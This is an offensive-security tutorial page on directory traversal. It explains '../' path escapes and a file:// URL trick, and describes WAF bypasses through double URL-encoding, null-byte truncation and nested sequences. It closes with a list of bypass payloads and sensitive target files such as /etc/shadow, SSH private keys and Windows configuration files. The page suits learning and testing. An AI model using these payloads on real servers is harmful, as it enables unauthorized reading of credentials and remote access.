---
description: ../
---

# Directory Traversal

Directory Traversal is a vulnerability that can be used to view files that we would otherwise not be able to view. This vulnerability comes in the form of failing to validate parameters that a user can change, like a `?page` parameter within a web application.

Directory Traversal can not only be used to read sensitive files, but also execute files and deface websites from one attacker machine.

<figure><img src="../.gitbook/assets/image (125).png" alt=""><figcaption><p><em>Taken from PortSwigger Web Security Academy</em></p></figcaption></figure>

## How it Works

In terminals of a Linux or Windows server, we can use `cd ..` to go up one directory. We can append multiple of these strings together to go up multiple directories, like `cd ../../../` would go up 3 directories.

Each `../` represents an **action**. If a server fails to parse the filename properly, then we can key in `../../../etc/passwd` to make the website load the `/etc/passwd` file from the server.

Additionally, it's important to note that local files on a system can be processed as a URL.&#x20;

```bash
http://example.com?url=http://google.com

# we can exploit this using
http://example.com?url=file://../../../../../../../etc/passwd
```

The `file://` wrapper would make the file name a URL to be processed in a browser. This is another way directory traversal can be used to read files.

<figure><img src="../.gitbook/assets/image (1694).png" alt=""><figcaption></figcaption></figure>

This vulnerability is dangerous because we can read sensitive files like SSH private keys and gain remote access to the server, or have entire source codes leaked.&#x20;

## Exploitation

Suppose that we have a website that is vulnerable, but it has some defence in depth and has a WAF as a last resort to prevent files from being read. There are still ways to bypass the WAF

### URL-Encoding

We can recursively URL encode our payload.

> URL-Encoding, otherwise known as Percent-Encoding, is a method to encode arbitrary data in a Uniform Resource Identifier (URI) using only the limited ASCII characters legal within a URI

By URL-encodng it, the WAF may fail to pick up on the payload in some cases. This works because most applications would take the user input and URL-decode once to view what are the actions required. By encoding it twice or thrice, we can bypass the WAF because it may not pick up the meaning of the payload, but the web application would still understand it and allow for succesful exploitation

```bash
# not url-encoded
../../../../../etc/passwd

#url encoded
..%2F..%2F..%2F..%2Fetc%2Fpasswd
```

### Null Byte

If the query passed in is meant to read a file of a specific file type, like `.php` or something, then we can truncate the rest of the query. Similar to SQL Injection where we append `-- -` to make everything else a comment, we would append `%00` in this case.

`%00` represents a single byte of data meaning NULL. This would terminate the query and cause the extension bit to not be processed by the backend, but it's still technically present as text and hence couuld bypass a WAF that only checks for the text portion.

```bash
# .png still present, bypass WAF
../../../../etc/passwd%00.png
```

### Nested Sequences

Sometimes, a website would outright block `../` characeters knowing that directory traversal would be attempted. In this case, we can make use of `....//` which would translate back to `../../` when processed. This can sometimes be used to bypass a WAF

### Downloading Files

Sometimes, we can access certain and download files and even binaries via directory traversal. We can check what's by looking into the /proc directory and install the files via curl and the -o flag. Retired from HTB is a machine that uses this, and we can download a binary that is vulnerbale to a ROP chaining vulnerability that would give us an initial shell.&#x20;

## Common Files and Payloads

To verify that we indeed have directory traversal, here are some common files that we can test it out with. Here are some common payloads that can be used to bypass basic WAFs.

<pre class="language-bash"><code class="lang-bash"><strong># common payloads
</strong>../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
..././
...\.\
<strong>
</strong><strong># for Linux
</strong>/etc/passwd
/etc/hosts
/etc/shadow # if we have privileges
/home/user/.ssh/id_rsa # if we need keys

# for Windows
C:/Users/Administrator/NTUser.dat
C:/Documents and Settings/Administrator/NTUser.dat
C:/boot.ini
C:/inetpub/wwwroot/global.asa
C:/Program Files/Apache Group/Apache2/conf/httpd.conf
C:/Program Files/Apache Group/Apache/conf/httpd.conf
C:/Program Files/Apache Group/Apache/logs/access.log
C:/Program Files/Apache Group/Apache/logs/error.log
C:/Program Files/FileZilla Server/FileZilla Server.xml
C:/Program Files/MySQL/data/hostname.err
</code></pre>
